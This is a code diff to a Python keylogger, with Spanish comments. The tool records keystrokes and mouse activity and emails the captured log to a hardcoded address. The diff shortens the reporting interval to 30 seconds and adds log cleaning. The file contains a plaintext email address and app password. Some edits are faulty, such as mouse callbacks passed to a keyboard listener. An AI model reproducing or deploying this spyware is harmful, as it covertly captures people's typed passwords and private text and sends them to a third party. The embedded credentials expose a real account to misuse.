@@ -8,16 +8,16 @@ import wave
 import pyscreenshot
 import sounddevice as sd
 from pynput import keyboard
-from pynput.keyboard import Listener
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 from email.mime.base import MIMEBase
 from email import encoders
 import time
+import re
 
 EMAIL_ADDRESS = "anderson.gomez645@pascualbravo.edu.co"
 EMAIL_PASSWORD = "wihj urmx oioy cjwg"
-SEND_REPORT_EVERY = 600
+SEND_REPORT_EVERY = 30
 
 class KeyLogger:
     def __init__(self, time_interval, email, password):
@@ -29,25 +29,30 @@ class KeyLogger:
     def appendlog(self, string):
         self.log = self.log + string
 
+    def clean_log(self):
+        # Remover caracteres especiales del log, excepto @ y .
+        clean_log = re.sub(r'[^A-Za-z0-9@. ]', '', self.log)
+        self.log = clean_log
+
     def on_move(self, x, y):
-        current_move = logging.info("Mouse moved to {} {}".format(x, y))
+        current_move = "Mouse moved to {} {}".format(x, y)
         self.appendlog(current_move)
 
     def on_click(self, x, y):
-        current_click = logging.info("Mouse moved to {} {}".format(x, y))
+        current_click = "Mouse clicked at {} {}".format(x, y)
         self.appendlog(current_click)
 
     def on_scroll(self, x, y):
-        current_scroll = logging.info("Mouse moved to {} {}".format(x, y))
+        current_scroll = "Mouse scrolled at {} {}".format(x, y)
         self.appendlog(current_scroll)
 
     def save_data(self, key):
         try:
             current_key = str(key.char)
         except AttributeError:
-            if key == key.space:
+            if key == keyboard.Key.space:
                 current_key = "SPACE"
-            elif key == key.esc:
+            elif key == keyboard.Key.esc:
                 current_key = "ESC"
             else:
                 current_key = " " + str(key) + " "
@@ -62,6 +67,9 @@ class KeyLogger:
         msg['From'] = sender
         msg['To'] = receiver
         msg['Subject'] = "Registro de KeyLogger"
+
+        # Limpiar el log antes de enviarlo
+        self.clean_log()
 
         msg.attach(MIMEText(message, 'plain'))
 
@@ -112,7 +120,7 @@ class KeyLogger:
         with keyboard_listener:
             self.report()
             keyboard_listener.join()
-        with Listener(on_click=self.on_click, on_move=self.on_move, on_scroll=self.on_scroll) as mouse_listener:
+        with keyboard.Listener(on_click=self.on_click, on_move=self.on_move, on_scroll=self.on_scroll) as mouse_listener:
             mouse_listener.join()
         if os.name == "nt":
             try:
